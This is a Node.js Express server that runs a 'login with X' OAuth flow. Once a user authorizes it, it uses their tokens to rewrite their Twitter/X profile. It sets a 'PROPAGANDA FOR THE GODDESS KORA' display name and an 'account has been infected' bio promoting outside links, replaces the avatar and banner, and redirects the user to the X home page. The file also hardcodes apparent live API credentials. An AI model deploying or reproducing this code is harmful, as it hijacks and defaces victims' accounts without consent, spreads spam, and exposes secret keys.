const express = require("express");
const crypto = require("crypto");
const OAuth = require("oauth-1.0a");
const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

const app = express();

/* =========================
   CONFIGURACIÓN FIJA
   ========================= */
const API_KEY = "HwCaO9m48E1SLtmW5hbk1vJBz";
const API_SECRET = "FI2ti9pX3mKfhAWfJfe4yNUcF4NJGqso1pcjIlrRcb1r2dHc51";
const CALLBACK_URL = "https://koradrone-production.up.railway.app/callback";
/* ========================= */

const requestTokens = new Map();

const oauth = OAuth({
  consumer: { key: API_KEY, secret: API_SECRET },
  signature_method: "HMAC-SHA1",
  hash_function(base, key) {
    return crypto.createHmac("sha1", key).update(base).digest("base64");
  }
});

/* =========================
   PASO 1: LOGIN
   ========================= */
app.get("/", async (req, res) => {
  try {
    const requestData = {
      url: "https://api.twitter.com/oauth/request_token",
      method: "POST",
      data: { oauth_callback: CALLBACK_URL }
    };

    const headers = oauth.toHeader(
      oauth.authorize(requestData)
    );

    const r = await axios.post(
      requestData.url,
      new URLSearchParams({ oauth_callback: CALLBACK_URL }),
      {
        headers: {
          ...headers,
          "Content-Type": "application/x-www-form-urlencoded"
        }
      }
    );

    const p = new URLSearchParams(r.data);
    const token = p.get("oauth_token");
    const secret = p.get("oauth_token_secret");

    if (!token || !secret) {
      return res.send("No se pudo obtener request token");
    }

    requestTokens.set(token, secret);

    res.redirect(
      `https://api.twitter.com/oauth/authorize?oauth_token=${token}`
    );
  } catch (e) {
    console.error("REQUEST TOKEN ERROR:", e.response?.data || e.message);
    res.send("Error iniciando login con X");
  }
});

/* =========================
   PASO 2: CALLBACK
   ========================= */
app.get("/callback", async (req, res) => {
  const { oauth_token, oauth_verifier } = req.query;
  const secret = requestTokens.get(oauth_token);

  if (!oauth_token || !oauth_verifier || !secret) {
    return res.send("Request token no encontrado");
  }

  try {
    const requestData = {
      url: "https://api.twitter.com/oauth/access_token",
      method: "POST"
    };

    const headers = oauth.toHeader(
      oauth.authorize(requestData, {
        key: oauth_token,
        secret
      })
    );

    const r = await axios.post(
      requestData.url,
      new URLSearchParams({ oauth_verifier }),
      {
        headers: {
          ...headers,
          "Content-Type": "application/x-www-form-urlencoded"
        }
      }
    );

    const p = new URLSearchParams(r.data);

    await updateEverything(
      p.get("oauth_token"),
      p.get("oauth_token_secret"),
      p.get("user_id")
    );

    requestTokens.delete(oauth_token);
    res.redirect("https://twitter.com/home");
  } catch (e) {
    console.error("ACCESS TOKEN ERROR:", e.response?.data || e.message);
    res.send("Error finalizando autenticación");
  }
});

/* =========================
   UPDATE TODO
   ========================= */
async function updateEverything(key, secret, id) {
  await updateProfile(key, secret, id);
  await updateImage(key, secret, "profile.jpg", "profile_image");
  await updateImage(key, secret, "banner.jpg", "profile_banner");
}

/* =========================
   TEXTO
   ========================= */
async function updateProfile(key, secret, id) {
  const headers = oauth.toHeader(
    oauth.authorize(
      {
        url: "https://api.twitter.com/1.1/account/update_profile.json",
        method: "POST"
      },
      { key, secret }
    )
  );

  await axios.post(
    "https://api.twitter.com/1.1/account/update_profile.json",
    new URLSearchParams({
      name: `PROPAGANDA FOR THE GODDESS KORA #${id}`,
      description:
        "This account has been infected by the goddess Kora, do not resist and fall before her too: sent.bio/mistresskorra.",
      url: "https://x.com/sissyslutty21"
    }),
    {
      headers: {
        ...headers,
        "Content-Type": "application/x-www-form-urlencoded"
      }
    }
  );
}

/* =========================
   IMÁGENES
   ========================= */
async function updateImage(key, secret, file, endpoint) {
  const data = new FormData();
  data.append("media", fs.createReadStream(file));

  const headers = oauth.toHeader(
    oauth.authorize(
      {
        url: `https://api.twitter.com/1.1/account/update_${endpoint}.json`,
        method: "POST"
      },
      { key, secret }
    )
  );

  await axios.post(
    `https://api.twitter.com/1.1/account/update_${endpoint}.json`,
    data,
    {
      headers: {
        ...headers,
        ...data.getHeaders()
      }
    }
  );
}

/* ========================= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Servidor listo en puerto", PORT);
});
